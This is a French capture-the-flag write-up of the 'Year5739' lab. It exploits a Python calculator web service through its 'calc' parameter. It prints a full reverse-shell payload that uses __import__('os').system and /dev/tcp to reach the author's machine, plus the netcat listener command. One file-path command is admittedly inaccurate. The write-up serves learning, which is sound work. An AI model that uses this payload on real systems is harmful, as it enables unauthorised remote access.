# Year5739

## Contexte
- **Nom du challenge** : Year5739
- **Catégorie** : Web / Exécution de code à distance
- **Difficulté** : non précisée
- **Objectif** : trouver et lire `user.txt`.

Les commandes ci-dessous reprennent la démarche suivie, avec une syntaxe corrigée.
`<IP>` désigne la machine cible et `TON_IP` l'adresse de ma machine accessible depuis la cible.

---

## 1. Reconnaissance

Je commence par un scan de tous les ports TCP avec l'option `-p-` :

```bash
nmap -p- <IP>
```

Le scan révèle notamment le port **5739 ouvert**. J'interroge ce port avec `curl`
pour examiner la réponse HTTP et ses en-têtes :

```bash
curl -i "http://<IP>:5739/"
```

Le service expose une **calculatrice**, qui accepte une expression via le paramètre `calc`.

---

## 2. Analyse / Identification de la vulnérabilité

Je teste d'abord le fonctionnement de la calculatrice avec une opération simple :

```bash
curl -sG "http://<IP>:5739/" --data-urlencode "calc=2+2"
```

La calculatrice renvoie le résultat attendu : **4**.
L'option `-G` transmet le paramètre dans l'URL, tandis que `--data-urlencode`
encode l'expression pour préserver notamment le signe `+`.

Ce premier test confirme que le paramètre est interprété comme un calcul.
Je tente ensuite d'y faire exécuter du code Python pour lancer une commande système.
Le succès du reverse shell décrit ci-dessous confirme une **exécution de code à distance (RCE)** :
le traitement de `calc` permet de dépasser les seules opérations arithmétiques.

---

## 3. Exploitation

### 3.1 Préparation de la réception du reverse shell

Pour recevoir la connexion, un port doit être en écoute sur ma machine.
Par exemple, avec Netcat dans un premier terminal :

```bash
nc -lvnp 4444
```

### 3.2 Injection dans la calculatrice

Dans un second terminal, j'envoie une expression Python qui importe le module `os`
et utilise `system()` pour lancer un **reverse shell Bash** :

```bash
curl -sG "http://<IP>:5739/" \
  --data-urlencode "calc=__import__('os').system(\"bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'\")"
```

Avec `curl -sG`, j'envoie une requête GET à la calculatrice sur le port **5739**.
`--data-urlencode` permet de passer mon code dans `calc` en encodant les caractères spéciaux.

`__import__('os').system(...)` sert à lancer une commande système depuis Python.
`bash -c` exécute la commande et `bash -i` ouvre un shell interactif.
La partie `/dev/tcp/TON_IP/4444` connecte ce shell à ma machine ; les redirections
`>&` et `0>&1` me permettent de recevoir ses réponses et de lui envoyer des commandes.

J'obtiens directement un shell sous le compte **Senku** : aucune élévation de
privilèges n'est nécessaire pour accéder au fichier utilisateur.

---

## 4. Recherche et lecture de user.txt

Depuis le shell de Senku, je me rends dans le répertoire contenant `user.txt`,
puis je lis le fichier :

```bash
cd /home/senku/user.txt
cat user.txt
```

Le chemin ci-dessus est à remplacer par le répertoire trouvé pendant le challenge :
son emplacement exact n'a pas été conservé dans les notes.

---

## 5. Flag

**Emplacement** : fichier `user.txt` accessible depuis le shell de **Senku**,
dans le répertoire trouvé lors de l'exploration de la machine.

## Outils utilisés
- `nmap` — scan de tous les ports TCP
- `curl` — interrogation du service HTTP et envoi du paramètre `calc`
- `nc` (Netcat) — exemple d'outil pour recevoir le reverse shell

## Techniques utilisées
- **Énumération** des ports avec `nmap -p-`
- Identification d'un **service HTTP sur un port non standard**
- **Injection de code Python** dans le paramètre `calc`
- **Exécution de commandes système** via `os.system()`
- Obtention d'un **reverse shell** sous le compte Senku
